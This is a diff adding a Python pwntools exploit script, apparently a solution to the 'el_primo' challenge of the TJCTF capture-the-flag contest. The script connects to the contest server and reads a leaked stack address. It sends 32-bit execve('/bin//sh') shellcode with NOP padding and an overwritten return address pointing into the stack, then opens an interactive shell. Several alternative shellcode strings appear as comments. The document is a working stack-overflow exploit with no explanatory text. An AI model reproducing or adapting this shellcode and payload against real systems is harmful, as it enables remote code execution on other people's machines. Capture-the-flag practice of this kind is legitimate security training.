@@ -1,0 +1,48 @@
+from pwn import *
+
+
+local = 0
+
+if local:
+	p = process('./el_primo')
+else:
+	p = remote('p1.tjctf.org', 8011)
+
+
+#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 
+#shellcode for 64 bits 24 bytes
+#shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\xb0\x3b\x0f\x05"
+#shellcode =  "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+
+# shell 18 bytes
+shellcode = "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+#shellcode = asm(shellcraft.sh())
+
+#shellcode = b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
+
+print(len(shellcode))
+print(p.recvline())
+
+out = p.recvline().strip().split(' ')
+
+sp = int(out[1],16)
+print(sp)
+
+
+padding = "\x90" * (28 - len(shellcode))
+
+eip = p32(sp)
+
+#eip = p32(0x5655560d)
+
+payload = ""
+payload += shellcode
+payload += padding
+payload += eip
+
+
+
+p.sendline(payload)
+p.interactive()
+p.close()
